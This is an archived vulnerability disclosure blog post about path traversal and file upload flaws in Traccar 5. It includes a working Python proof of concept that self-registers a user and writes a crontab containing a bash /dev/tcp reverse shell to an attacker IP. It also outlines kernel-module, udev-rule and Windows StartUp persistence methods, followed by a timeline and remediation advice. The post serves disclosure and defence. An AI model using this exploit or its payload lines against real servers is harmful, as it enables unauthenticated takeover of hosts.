---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-08-23_traccar-5-remote-code-execution-vulnerabilities.md
original_filename: 2024-08-23_traccar-5-remote-code-execution-vulnerabilities.md
title: Traccar 5 Remote Code Execution Vulnerabilities
category: documents
detected_topics:
- command-injection
- file-upload
- otp
- path-traversal
- mfa
- automation-abuse
tags:
- imported
- documents
- command-injection
- file-upload
- otp
- path-traversal
- mfa
- automation-abuse
language: en
raw_sha256: bf973ecaeb7515d69e15f2c21e825fd32f48604b9d8af70801c0b8696f312d61
text_sha256: 05e377f7d963085a1e7c4670fdf24200b925878142d5d78fa6a8fbad0d9357fc
ingested_at: '2026-06-28T07:32:37Z'
sensitivity: unknown
redactions_applied: true
---

# Traccar 5 Remote Code Execution Vulnerabilities

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-08-23_traccar-5-remote-code-execution-vulnerabilities.md
- Source Type: markdown
- Detected Topics: command-injection, file-upload, otp, path-traversal, mfa, automation-abuse
- Ingested At: 2026-06-28T07:32:37Z
- Redactions Applied: True
- Raw SHA256: `bf973ecaeb7515d69e15f2c21e825fd32f48604b9d8af70801c0b8696f312d61`
- Text SHA256: `05e377f7d963085a1e7c4670fdf24200b925878142d5d78fa6a8fbad0d9357fc`


## Content

---
title: "Traccar 5 Remote Code Execution Vulnerabilities"
url: "https://www.horizon3.ai/attack-research/disclosures/traccar-5-remote-code-execution-vulnerabilities/"
authors: ["Naveen Sunkavally"]
programs: ["Traccar"]
bugs: ["RCE", "Unrestricted file upload", "Path traversal", "Security code review"]
publication_date: "2024-08-23"
added_date: "2024-08-26"
source: "pentester.land/writeups.json"
original_index: 49
scraped_via: "browseros"
---

# Traccar 5 Remote Code Execution Vulnerabilities

Traccar 5 Remote Code Execution Vulnerabilities
Naveen Sunkavally
August 23, 2024
Attack Blogs, Disclosures

Traccar is a popular open source GPS tracking system used both by people for personal use and businesses for fleet management. This post covers two related path traversal vulnerabilities affecting Traccar 5 that could lead to remote code execution: CVE-2024-31214, reported by Horizon3.ai, and CVE-2024-24809, reported by @yiliufeng168. These vulnerabilities can be exploited by unauthenticated attackers if guest registration is enabled, which is the default configuration for Traccar 5.

Vulnerability Summary

Traccar is a Java based application that runs Jetty as its web server. Within the Traccar interface, users can register devices for tracking. Those devices communicate with the Traccar server over a wide variety of protocols to communicate their location.

Traccar 5.1 introduced a new feature that lets users upload an image for a device.

CVE-2024-31214 and CVE-2024-24809 concern multiple vulnerabilities in the code to handle device image file uploads.

https://github.com/traccar/traccar/blob/4d9d78496a0260c6cb43211065a8aafe8cc7e7a9/src/main/java/org/traccar/api/resource/DeviceResource.java

The device image upload API uploads the file to a location based on three variables:

the device’s unique id
a static filename called device
an extension that is obtained from the Content-Type header.

The first variable (device unique id) and third variable (extension) can be manipulated by an attacker in interesting ways.

The device’s unique id can contain path traversal sequences like ../, allowing the attacker to place files anywhere on the file system.

The Content-Type header can be manipulated to set the file extension to an arbitrary value. For instance a Content-Type header of image/html will result in a file called device.html being created.

The Content-Type header can be manipulated to contain path traversal sequences like ../ by using parameters and double-quoted strings. On Linux, this allows an attacker to place files anywhere on the file system. This doesn’t work on Windows because of restrictions on the types of characters allowed to be in file names.

The Github security issue we raised dives deeper into the details of each of these issues. In this post we’ll focus on how these issues can be exploited for remote code execution.

Remote Code Execution

The net result of CVE-2024-31214 and CVE-2024-24809 is that an attacker can place files with arbitrary content anywhere on the file system. However an attacker only has partial control over the filename. In particular, the filename must be one of three forms:

device.ext, where the attacker can control ext, but there MUST be an extension
blah", where the attacker can control blah but the filename must end with a double quote
blah1";blah2=blah3, where the attacker can control blah1, blah2, and blah3, but the double quote semicolon sequence and equals symbol MUST be present.

These limitations mean that an attacker can’t overwrite any existing files, such as velocity templates, on the file system to get to remote code execution. The usual Java war file upload vector was also not available as an option. So this led us to an interesting puzzle – what are all the ways we could get to RCE with these filename limitations?

Method 1: Uploading a Crontab File

On Red Hat-based Linux systems, a straightforward way to get remote code execution is by uploading a crontab file. The following proof-of-concept code self-registers a Traccar user and then exploits the path traversal in the Content-Type header to upload a crontab file, resulting in a reverse shell on the attacker host. This does not work on Debian/Ubuntu based Linux systems because crontab file names must not contain periods or double quotes (reference: https://manpages.ubuntu.com/manpages/xenial/en/man8/cron.8.html).

from argparse import ArgumentParser
import requests
import sys
import secrets

def register(url) -> tuple:
  registration_url = f'{url}/api/users'
  username = secrets.token_hex(16)
  email = f'{username}@example.org'
  password=***REDACTED***
  user_dict = { 'name': username, 'email': email, 'password': password, 'totpKey': None}
  r = requests.post(registration_url, json=user_dict, verify=False, timeout=10)
  id = r.json()['id']
  print(f'Created user id {id} with email {email} and password {password}')
  return (email, password)

def login(url, email, password) -> requests.Session:
  session = requests.Session()
  login_url = f'{url}/api/session'
  r = session.post(login_url, data = {'email': email, 'password': password}, verify=False, timeout=10)
  r.json()['id'] # got expected login response
  print(f'Logged in')
  return session

def create_device(url, session):
  device_url = f'{url}/api/devices'
  device_name = secrets.token_hex(12)
  unique_id = device_name
  r = session.post(device_url, json={'name': device_name, 'uniqueId': unique_id}, verify=False, timeout=10)
  device_id = r.json()['id']
  print(f'Created device {device_id} with unique id {unique_id}')
  return (device_id, device_name, unique_id)

def upload(url, session, device_id, content_type, data_bytes):
  upload_url = f'{url}/api/devices/{device_id}/image'
  headers = {
  'Content-Type': content_type
  }
  r = session.post(upload_url, headers=headers, data=data_bytes, verify=False, timeout=10)
  if r.status_code == 200:
  return r.text
  else:
  print(f'Upload failed, maybe Windows?: {r.status_code}: {r.text}')
  sys.exit(1)

parser = ArgumentParser()
parser.add_argument('url', help='target URL')
parser.add_argument('ip', help='attacker IP to catch a rev shell')
parser.add_argument('port', help='attacker port to catch a rev shell')
args = parser.parse_args()

url = args.url.rstrip('/')
email, password=***REDACTED***
session = login(url, email, password)
device_id, _, _ = create_device(url, session)

# upload test file first, creates media dir if it doesn't exist
upload(url, session, device_id, 'image/png', b'test')
# create dir named device.png;a=" under /opt/traccar/media/<device_unique_id>/ (this will fail on Windows)
upload(url, session, device_id, 'image/png;a="/b"', b'test')

cronshell_bytes = f"* * * * * root /bin/bash -c '/bin/bash -i >& /dev/tcp/{args.ip}/{args.port} 0>&1'\n".encode()
cron_file_name = secrets.token_hex(12)
print(f'Uploading crontab file to /etc/cron.d/{cron_file_name}"')
upload(url, session, device_id,
  f'image/png;a="/../../../../../../../../../etc/cron.d/{cron_file_name}"', cronshell_bytes)
print(f'Done')

Method 2: Uploading a Kernel Module

The remaining methods for remote code execution require some level of user interaction, either in the form of a user logging into the host or rebooting the host. These methods take advantage of the fact that Traccar is installed as a root/system level user.

A minor variation of the above crontab proof-of-concept can be used to the drop the following files on disk instead of a crontab file.

Your favorite kernel module as a .ko file, dropped into /root/somename.ko
A somename.conf file dropped into the /etc/modules-load.d/ folder. This file should contain a single entry with somename.
A someoname.conf file dropped into the /etc/modprobe.d/ folder. This file should contain an install directive to insert the kernel module at startup.

For example, let’s say somename is a";a=b. A kernel module named a";a=b.ko could be dropped in the /root folder.

A file called a";a=b.conf could be dropped in in the /etc/modules-load.d folder, containing the following data:

a";a=b

And a file called a";a=b.conf could be dropped in the /etc/modprobe.d/ folder, containing the following data:

install a";a=b /sbin/insmod '/root/a";a=b.ko'

When the machine is restarted by the victim, the systemd-modules-load service will uses the config in the modprobe conf file to install the kernel module, achieving remote code execution.

Method 3: Creating a udevd rule

Colleague @vincentabruzzo pointed out an amazing method to remote code execution by dropping a file in the /etc/udevd/rules.d folder. The udevd service on Linux executes actions in userspace in response to hardware events, such as a device being plugged in. These actions can include arbitrary commands to execute.

For instance, using a minor variation of the crontab proof-of-concept above, a file called a";a=b.rules could be dropped into the /etc/udevd/rules.d folder. This file could contain something like:

KERNEL=="*",RUN+="/bin/bash -c 'touch /root/RCE'"

When the machine is restarted (or some other hardware event is raised), the command will fire, resulting in remote code execution.

Method 4: Uploading a Windows Shortcut File

On Windows systems, the path traversal in the device unique id property must be exploited to place a file named device.ext on the file system, where ext is attacker-controlled. The path traversal in the Content-Type header cannot be exploited because Windows does not accept filenames containing double quotes.

One path to remote code execution is to place a malicious shortcut file called device.lnk in the Windows system StartUp folder, C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp. A Windows shortcut contains a reference to a command to execute. When placed in the StartUp folder, the command referenced by the shortcut is executed when any victim user logs into the vulnerable Traccar host. We tested this out successfully using the open source pylink library to generate a malicious shortcut file.

Timeline

Our report for CVE-2024-31214 included all three issues: the path traversal in the device’s unique id attribute, the unrestricted file extension, and the path traversal in the Content-Type header. We noticed as we reported this issue though that there was already a fix for the first issue in the main line that had gone in a couple of months before our report. We presumed another researcher had reported a similar issue but were puzzled why wasn’t there already an official release with this fix.

After our disclosure, the maintainer fixed the path traversal in the Content-Type header and locked down the file extensions to a known set. The maintainer also changed the guest registration setting to be off by default in Traccar 6, per our recommendation.

We believe both CVE-2024-31214 and CVE-2024-2809 should be treated as critical issues because guest registration is on by default in Traccar 5, effectively allowing unauthenticated access.

April 3, 2024: Horizon3 reports vulnerability via GitHub.
April 5, 2024: Report acknowledged
April 6, 2024: Traccar 6 released with fixes
April 10, 2024: GitHub advisory published for CVE-2024-31214, GitHub advisory published for CVE-2024-24809
Detection and Remediation

A network request to the /api/server endpoint can determine the version of Traccar running as well and if user self-registration is enabled:

% curl http://34.229.220.30:8082/api/server
{"id":1,"attributes":{},"registration":true,"readonly":false,"deviceReadonly":false,"map":null,"bingKey":null,"mapUrl":null,"overlayUrl":null,"latitude":0.0,"longitude":0.0,"zoom":0,"twelveHourFormat":false,"forceSettings":false,"coordinateFormat":null,"limitCommands":false,"disableReports":false,"fixedEmail":false,"poiLayer":null,"announcement":null,"emailEnabled":false,"geocoderEnabled":true,"textEnabled":false,"storageSpace":null,"newServer":false,"openIdEnabled":false,"openIdForce":false,"version":"5.12"}

Traccar versions 5.1 to 5.12 are vulnerable to CVE-2024-31214 and CVE-2024-2809. If the registration setting is true, readOnly is false, and deviceReadonly is false, then an unauthenticated attacker can exploit these vulnerabilities. These are the default settings for Traccar 5.

At the time we reported CVE-2024-31214 to Traccar, we found ~1400 Traccar 5 servers on the Internet running with these default settings. This doesn’t account for older Traccar 5 versions that shipped with default admin credentials.

To remediate, we advise users to upgrade to Traccar 6, or switch the registration setting to false. Be aware that if the Traccar host has already been compromised, then logging into the Traccar host or rebooting it could inadvertently enable attacker access by triggering any latent exploit payloads, as described in the Remote Code Execution section.

Conclusion

In this post we walked through two related critical vulnerabilities, CVE-2024-31214 and CVE-2024-2809, affecting Traccar 5 that could result in unauthenticated remote code execution. These vulnerabilities are fixed in Traccar 6. Beyond addressing the specific issues, the biggest improvement we facilitated was turning self-registration off by default starting in Traccar 6. This significantly reduces the attack surface available to unauthenticated attackers and will have a lasting impact on improving the security posture of Traccar for years to come.

Get a demo and quickly verify you’re not exploitable.

Get Your Demo

How can NodeZero help you?
Let our experts walk you through a demonstration of NodeZero®, so you can see how to put it to work for your organization.
Get a Demo
Share:
